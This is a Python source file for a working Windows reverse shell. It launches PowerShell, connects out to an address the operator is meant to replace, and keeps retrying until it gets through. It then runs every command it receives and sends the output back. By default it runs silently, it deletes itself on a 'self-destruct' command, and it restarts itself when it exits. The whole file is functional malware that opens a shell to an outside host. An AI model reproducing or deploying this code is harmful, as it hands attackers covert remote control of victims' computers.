import subprocess
import threading
import socket
import sys
import os


__author__ = "0xded"


env = os.environ.copy()
powershell = subprocess.Popen("powershell.exe", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True, env=env)
silentMode = True
flag = True

def response(target: socket.socket, process: subprocess.Popen) -> None:
    if not silentMode: sys.stdout.write("Started Powershell.exe\r\n\r\n")
    global flag

    while flag:
        data = process.stdout.read(1)
        target.send(data)

        if not silentMode:
            try:
                sys.stdout.write(data.decode("utf-8"))
                sys.stdout.flush()
            except UnicodeDecodeError:
                pass
            except Exception as e:
                if not silentMode: print(f"[!] (response) exception: {e}")
    
    target.close()
    
def sendcommand(process: subprocess.Popen, command):
    try:
        process.stdin.write(command + b'\n')
        process.stdin.flush()

    except:
        if not silentMode:
            print("[!] Exiting (sendcommand::error)")
        sys.exit()


if __name__ == "__main__":
    #Replace IP
    addr = ("127.0.0.1", 20031)

    targetSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            targetSock.connect(addr)
            break
        except ConnectionRefusedError:
            pass
        except Exception as e:
            if not silentMode: print(f"[!] Exception: {e}")

    if not silentMode: print(f"[*] Connected to {addr[0]}:{addr[1]}")

    responseThread = threading.Thread(target=response, args=(targetSock, powershell,), daemon=True)
    responseThread.start()
    
    while True:
        try:
            data = targetSock.recv(1024)
            dataRecv = data.decode("utf-8")
            if dataRecv != "":
                if dataRecv == "stop" or dataRecv == "exit" or dataRecv == "quit":
                    flag = False
                    targetSock.close()
                    break

                if dataRecv == "self-destruct" or dataRecv == "kys" or dataRecv == "self destruct":
                    os.remove(sys.argv[0])
                
                sendcommand(powershell, data)

        except Exception as e:
            if not silentMode:
                print(f"Error: {e}")
        
        except KeyboardInterrupt:
            if not silentMode:
                print("[!] Keyboard Interrupt!")
                flag = False
                targetSock.close()
                break

        except:
            if not silentMode:
                print("Idk?")

    if not silentMode: print("[X] Goodbye!")

    os.execl(sys.executable, sys.executable, *sys.argv)
